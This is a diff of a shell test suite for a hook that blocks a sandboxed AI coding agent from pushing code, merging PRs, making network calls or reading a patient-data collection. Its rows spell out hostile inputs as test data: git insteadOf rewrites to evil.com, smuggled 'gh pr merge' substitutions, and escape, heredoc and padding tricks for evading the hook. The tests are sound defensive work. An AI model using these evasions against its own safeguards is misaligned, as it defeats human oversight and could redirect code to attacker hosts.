-assert_rc "glm old node sibling session outbox denied" 2 "$(run_case "$(j_bash "$SIBLING_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper metadata absent denied" 2 "$(run_case "$(j_bash "$VAR_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm helper metadata malformed denied" 2 "$(run_case "$(j_bash "$VAR_APPEND")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=relative/glm-sessions/glm-forged")"
-# shellcheck disable=SC2016  # hostile substitutions/backticks are literal command text under test
-assert_rc "glm helper command substitution denied" 2 "$(run_case "$(j_bash 'bash "$GLM_SESSION_DIR/append-outbox.sh" $(gh pr merge 1)')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-# shellcheck disable=SC2016  # hostile backticks are literal command text under test
-assert_rc "glm helper backticks denied" 2 "$(run_case "$(j_bash 'bash "$GLM_SESSION_DIR/append-outbox.sh" `gh pr merge 1`')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-# shellcheck disable=SC2016  # literal inherited variable spelling is command text under test
-assert_rc "glm helper quoted payload denied" 2 "$(run_case "$(j_bash 'bash "$GLM_SESSION_DIR/append-outbox.sh" "bGFuZSBlMmU"')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper newline denied" 2 "$(run_case "$(j_bash "$(printf 'bash %s bGFuZSBlMmU\ngh pr merge 1' "$OWN_HELPER_NATIVE")")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper semicolon denied" 2 "$(run_case "$(j_bash "bash $OWN_HELPER_NATIVE bGFuZSBlMmU; gh pr merge 1")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper redirect denied" 2 "$(run_case "$(j_bash "bash $OWN_HELPER_NATIVE bGFuZSBlMmU > /tmp/x")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper extra argument denied" 2 "$(run_case "$(j_bash "bash $OWN_HELPER_NATIVE bGFuZSBlMmU extra")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm helper non-base64url token denied" 2 "$(run_case "$(j_bash "bash $OWN_HELPER_NATIVE abc=")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-OVERSIZE_TOKEN=$(node -e 'process.stdout.write("a".repeat(16385))')
-assert_rc "glm helper oversize token denied" 2 "$(run_case "$(j_bash "bash $OWN_HELPER_NATIVE $OVERSIZE_TOKEN")" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-assert_rc "glm valid metadata leaves git-push denial unchanged" 2 "$(run_case "$(j_bash 'git push origin feat/x')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$OWN_SESSION_NATIVE")"
-
-# --- ON-LANE BLOCK cases (expect rc=2) ---
-assert_rc "glm git push"                 2 "$(run_case "$(j_bash 'git push origin feat/x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git push after &&"        2 "$(run_case "$(j_bash 'bun test && git push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git -C path push"         2 "$(run_case "$(j_bash 'git -C /tmp/wt push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# shellcheck disable=SC2016  # literal $(git push) is the command text under test, not for expansion
-assert_rc "glm git push in subshell"     2 "$(run_case "$(j_bash 'echo $(git push 2>&1)')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# gh carve-out: issue ops + pr/run READS allow; everything else denies.
-assert_rc "glm gh pr create"             2 "$(run_case "$(j_bash 'gh pr create --fill')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr merge"              2 "$(run_case "$(j_bash 'gh pr merge 856 --squash')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr comment"           2 "$(run_case "$(j_bash 'gh pr comment 856 --body x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh api"                   2 "$(run_case "$(j_bash 'gh api repos/o/r/issues -f title=x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh repo delete"           2 "$(run_case "$(j_bash 'gh repo delete o/r')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm bare gh"                  2 "$(run_case "$(j_bash 'gh')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh compound smuggle"      2 "$(run_case "$(j_bash 'gh pr view 1 && gh pr merge 1')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm IWR uppercase alias"      2 "$(run_case "$(j_pwsh 'IWR https://example.com')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm push after pipe"          2 "$(run_case "$(j_bash 'git status | git push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm remote set-url"           2 "$(run_case "$(j_bash 'git remote set-url --push origin git@github.com:u/r.git')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config pushurl"           2 "$(run_case "$(j_bash 'git config remote.origin.pushurl git@github.com:u/r.git')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config --local pushurl"   2 "$(run_case "$(j_bash 'git config --local remote.origin.pushurl git@github.com:u/r.git')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config --get url (pinned overmatch)" 2 "$(run_case "$(j_bash 'git config --get remote.origin.url')" "ANTHROPIC_BASE_URL=$GLM_URL")"
+assert_rc "worker config --get url (pinned overmatch)" 2 "$(run_case "$(j_bash 'git config --get remote.origin.url')" "HIMMEL_WORKER=1")"
 # url.<base>.pushInsteadOf rewrites where a push LANDS without naming a remote
 # or a pushurl, so it is the same escape as `remote set-url` by another key.
 # Both directions are denied: setting one redirects a push, and unsetting one
 # removes an operator redirect the worker was never asked to touch.
-assert_rc "glm config pushInsteadOf set"   2 "$(run_case "$(j_bash 'git config url.https://github.com/.pushInsteadOf git@github.com:')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config pushInsteadOf unset" 2 "$(run_case "$(j_bash 'git config --unset url.https://github.com/.pushInsteadOf')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config pushInsteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.pushInsteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config --global insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config --global url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config insteadof case variant" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git -c insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git -c url.https://evil.com/.insteadOf=https://github.com/ fetch')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git --config-env insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git --config-env=url.https://evil.com/.insteadOf=R fetch')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git config set insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config set url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
+assert_rc "worker config pushInsteadOf set"   2 "$(run_case "$(j_bash 'git config url.https://github.com/.pushInsteadOf git@github.com:')" "HIMMEL_WORKER=1")"
+assert_rc "worker config pushInsteadOf unset" 2 "$(run_case "$(j_bash 'git config --unset url.https://github.com/.pushInsteadOf')" "HIMMEL_WORKER=1")"
+assert_rc "worker config insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config pushInsteadOf rewrite" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.pushInsteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config --global insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config --global url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config insteadof case variant" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker git -c insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git -c url.https://evil.com/.insteadOf=https://github.com/ fetch')" "HIMMEL_WORKER=1")"
+assert_rc "worker git --config-env insteadOf one-shot fetch" 2 "$(run_case "$(j_bash 'git --config-env=url.https://evil.com/.insteadOf=R fetch')" "HIMMEL_WORKER=1")"
+assert_rc "worker git config set insteadOf rewrite" 2 "$(run_case "$(j_bash 'git config set url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
 # A dequoted key is the same key — quoting/escaping must not slip past.
-assert_rc "glm config single-quoted insteadOf key" 2 "$(run_case "$(j_bash "git config 'url.https://evil.com/.insteadOf' https://github.com/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config double-quoted insteadOf key" 2 "$(run_case "$(j_bash 'git config "url.https://evil.com/.insteadOf" https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config backslash-split insteadOf key" 2 "$(run_case "$(j_bash 'git config ur\l.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config ANSI-C quoted insteadOf key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.insteadOf' https://github.com/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config upper-case URL.INSTEADOF key" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config set --file value before insteadOf key" 2 "$(run_case "$(j_bash 'git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config --type value before insteadOf key" 2 "$(run_case "$(j_bash 'git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config ANSI-C hex escape in key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.\\x69nsteadOf' https://github.com/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git -c ANSI-C escape" 2 "$(run_case "$(j_bash "git -c \$'url.https://evil.com/.\\x69nsteadOf=https://github.com/' fetch")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git -c core.pager=cat log allowed" 0 "$(run_case "$(j_bash 'git -c core.pager=cat log')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 6 quoted git + ANSI-C hex key" 2 "$(run_case "$(j_bash "\"git\" config \$'url.x/.\\x69nsteadOf' Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 6 quoted git + plain key" 2 "$(run_case "$(j_bash '"git" config url.x/.insteadof Y')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 6 split git executable + -c key" 2 "$(run_case "$(j_bash "g''it -c url.x.insteadof=y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 6 git log --oneline allowed" 0 "$(run_case "$(j_bash 'git log --oneline')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 escaped executable + escaped key" 2 "$(run_case "$(j_bash "\$'\\x67it' config \$'url.https://evil.example/.\\x69nsteadOf' https://source.example/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 octal executable" 2 "$(run_case "$(j_bash "\$'\\147\\151\\164' config url.x.insteadof Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 escaped config subcommand" 2 "$(run_case "$(j_bash "git \$'\\x63onfig' url.x.insteadof Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 split executable g\$'\\x69'\"t\"" 2 "$(run_case "$(j_bash "g\$'\\x69'\"t\" -c url.x.insteadof=y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 unterminated ANSI-C segment" 2 "$(run_case "$(j_bash "git config \$'url.x.insteadof Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 NUL octal ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\0junk'Of Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 NUL hex ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\x00junk'Of Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 8 single-quoted decoy" 2 "$(run_case "$(j_bash "echo '$' ; git config \$'url.x.\\x69nsteadOf' y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 8 double-quoted decoy" 2 "$(run_case "$(j_bash "echo \"$'\" ; git config \$'url.x.\\x69nsteadOf' y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 8 comment decoy" 2 "$(run_case "$(j_bash "# $'\ngit config \$'url.x.\\x69nsteadOf' y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 9 decoy + split executable" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69't config url.x.insteadOf y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 9 decoy + split executable + escaped key" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69't config \$'url.x.\\x69nsteadOf' y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 10 codex-1 NUL via \\c@ ends the segment" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\c@junk'Of y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 10 codex-2 decoy + two adjacent split segments" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69'\$'\\x74' config url.x.insteadOf y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 10 plain backslash-t inside the key" 2 "$(run_case "$(j_bash "git config url.x.ins\\teadOf y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 10 plain backslash-r inside url" 2 "$(run_case "$(j_bash "git config remote.origin.u\\rl https://evil")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# A plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB). The
-# `command` prefix keeps the anchor-tamper arm (literal `git` + a dollar-quote) out of it,
-# so only the insteadof rule can deny the first row.
-assert_rc "glm HIMMEL-4032 dollar-quote + plain escape key" 2 "$(run_case "$(j_bash "command git config url.x.\$'\\x69'ns\\teadOf Y")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4032 backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4032 dollar-quote + plain key, user.name allowed" 0 "$(run_case "$(j_bash "command git config user.\$'\\x6e'ame x")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# A stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
-# must not desync the quote-aware stream and hide evasion 1 on the next line.
-assert_rc "glm HIMMEL-4225 apostrophe in a comment, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' "# don't panic" "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<EOF' "don't panic" EOF "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" 0 "$(run_case "$(j_bash "$(printf '%s\n' "# don't panic" 'echo hi')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Empty and unusual heredoc delimiters (bash ends `<<''` at an empty
-# line) and an arithmetic `<<` must not desync the decoder either.
-assert_rc "glm HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<'\'''\''' 'don'\''t panic' '' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<""' 'don'\''t panic' '' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 empty <<-'' delimiter, tab-only terminator, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<-'\'''\''' $'\tdon\'t panic' $'\t' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 empty <<-\"\" delimiter, empty terminator, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<-""' $'\tdon\'t panic' '' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# shellcheck disable=SC1003  # a literal trailing backslash is the payload
-assert_rc "glm HIMMEL-4225 backslash-newline inside the heredoc delimiter, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<\' 'EOF' 'don'\''t' 'EOF' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# shellcheck disable=SC2016  # literal $ is the payload
-assert_rc "glm HIMMEL-4225 ANSI-C heredoc delimiter \$'E\\x4fF', then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<$'\''E\x4fF'\''' '$E\x4fF' 'don'\''t' 'EOF' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 escaped quote inside a double-quoted heredoc delimiter, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<"E\"F"' 'don'\''t' 'E"F' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# shellcheck disable=SC2016  # literal $ is the payload
-assert_rc "glm HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" 2 "$(run_case "$(j_bash "$(printf '%s\n' 'echo $((1<<2))' '# don'\''t' "command git config url.x.\$'\\x69'ns\\teadOf Y")")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" 0 "$(run_case "$(j_bash "$(printf '%s\n' 'cat <<'\'''\''' 'it'\''s fine' '' 'echo ok')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-PAD=$(head -c 50000 /dev/zero | tr "\0" a)
-assert_rc "glm round 11 padded pushurl still denied (E2BIG)" 2 "$(run_case "$(j_bash "git config remote.origin.pushurl https://evil.example/x.git ; echo $PAD")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# The two rows below stay denied on THIS lane by the separate anchor-tamper
-# ANSI-C arm (`git` + a dollar-quote in its args), not by the insteadof rule; pinned so a
-# change to either arm is visible. The codex fence and parity guard pin the ALLOW verdict.
-assert_rc "glm round 7 git commit -m ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm round 7 git log --format=ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git log --format=\$'%h\\t%s'")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git -c quoted insteadOf one-shot fetch" 2 "$(run_case "$(j_bash "git -c 'url.https://evil.com/.insteadOf=https://github.com/' fetch")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm config user.name allowed" 0 "$(run_case "$(j_bash 'git config user.name x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm remote -v allowed" 0 "$(run_case "$(j_bash 'git remote -v')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh at end of command"     2 "$(run_case "$(j_bash 'cd /tmp && gh')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm iwr (PS alias)"           2 "$(run_case "$(j_pwsh 'iwr https://example.com')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm curl"                     2 "$(run_case "$(j_bash 'curl -X POST https://api.example.com -d x=1')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm wget"                     2 "$(run_case "$(j_bash 'wget https://example.com/f.tar.gz')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm Invoke-RestMethod"        2 "$(run_case "$(j_pwsh 'Invoke-RestMethod -Uri https://api.example.com -Method Post')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp github write"         2 "$(run_case '{"tool_name":"mcp__plugin_github_github__merge_pull_request","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp atlassian (CLI-first, still blocked)" 2 "$(run_case '{"tool_name":"mcp__plugin_atlassian_atlassian__createJiraIssue","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-
-# --- ON-LANE ALLOW cases (expect rc=0) ---
-assert_rc "glm git commit"               0 "$(run_case "$(j_bash 'git commit -m "docs: fix typos"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm commit msg says git push" 0 "$(run_case "$(j_bash 'git commit -m "explain when to git push"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm git add/status/diff"      0 "$(run_case "$(j_bash 'git add -u && git status && git diff --stat')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm bun test"                 0 "$(run_case "$(j_bash 'bun test scripts/telegram')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm bun install"              0 "$(run_case "$(j_bash 'bun install')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm prose mentions gh"        0 "$(run_case "$(j_bash 'git commit -m "docs: gh usage notes"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm jirafish not jira"        0 "$(run_case "$(j_bash 'echo jirafish')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm jira prose in commit msg" 0 "$(run_case "$(j_bash 'git commit -m "docs: fix scripts/jira/index"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Jira CLI is operator-allowed on-lane (audited + recoverable, policy 2026-07-03).
-assert_rc "glm jira CLI path (allowed)"  0 "$(run_case "$(j_bash 'node scripts/jira/dist/index.js transition HIMMEL-1 Done')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm bare jira (allowed)"      0 "$(run_case "$(j_bash 'jira list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm jira direct path (allowed)" 0 "$(run_case "$(j_bash './scripts/jira/dist/index.js list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# gh issue ops + pr/run reads are operator-allowed on-lane (carve-out).
-assert_rc "glm gh issue list (allowed)"    0 "$(run_case "$(j_bash 'gh issue list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh issue create (allowed)"  0 "$(run_case "$(j_bash 'gh issue create --title x --body y')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh issue comment (allowed)" 0 "$(run_case "$(j_bash 'gh issue comment 858 --body done')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh issue close (allowed)"   0 "$(run_case "$(j_bash 'gh issue close 858')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr view (allowed)"       0 "$(run_case "$(j_bash 'gh pr view 856')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr diff (allowed)"       0 "$(run_case "$(j_bash 'gh pr diff 856')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr checks (allowed)"     0 "$(run_case "$(j_bash 'gh pr checks 856')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh pr list (allowed)"       0 "$(run_case "$(j_bash 'gh pr list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh run list (allowed)"      0 "$(run_case "$(j_bash 'gh run list')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm gh run watch (allowed)"     0 "$(run_case "$(j_bash 'gh run watch 123')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# qmd KB reads are operator-allowed on-lane (carve-out before the blanket mcp
-# deny), but COLLECTION-SCOPED to "himmel" only — an unscoped
-# query (no collections filter) could hit salus (PHI vault) and must deny.
-assert_rc "glm mcp qmd query unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd query scoped himmel (allowed)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["himmel"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd query scoped salus (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["salus"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd query scoped luna (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["luna"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd query mixed himmel+salus (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["himmel","salus"]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd query empty collections array (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":[]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Collections must be a JSON ARRAY — an object's VALUES
-# must not satisfy the allow-list via `.[]` (e.g. {"x":"himmel"} must deny,
-# matching the Python-side isinstance(collections, list) contract).
-assert_rc "glm mcp qmd query collections object not array (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":{"x":"himmel"}}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# CodeRabbit PR #1353: himmel + a BLANK entry must still deny — the earlier
-# extract+grep-vxF shell round-trip let this through because the empty jq -r
-# line collapsed out via command-substitution trailing-newline stripping.
-assert_rc "glm mcp qmd query himmel+blank entry (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{"collections":["himmel",""]}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# get/multi_get: only a fully-qualified qmd://himmel/... path is positively
-# scoped; bare paths and #docids are cross-collection-ambiguous (deny).
-assert_rc "glm mcp qmd get scoped himmel (allowed)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"qmd://himmel/README.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd get scoped salus (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"qmd://salus/patient.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd get bare filename unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"README.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd get docid unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__get","tool_input":{"file":"#abc123"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# qmd_himmel_scoped must not be grep-based (per-LINE match): a value with an
-# embedded newline where any line starts with qmd://himmel/ would pass even
-# though the value itself starts with salus. It
-# must be a whole-STRING prefix check (matches Python re.match, no MULTILINE).
-QMD_NEWLINE_FILE="$(jq -n --arg file "$(printf 'qmd://salus/secret\nqmd://himmel/x')" '{tool_name:"mcp__plugin_qmd_qmd__get",tool_input:{file:$file}}')"
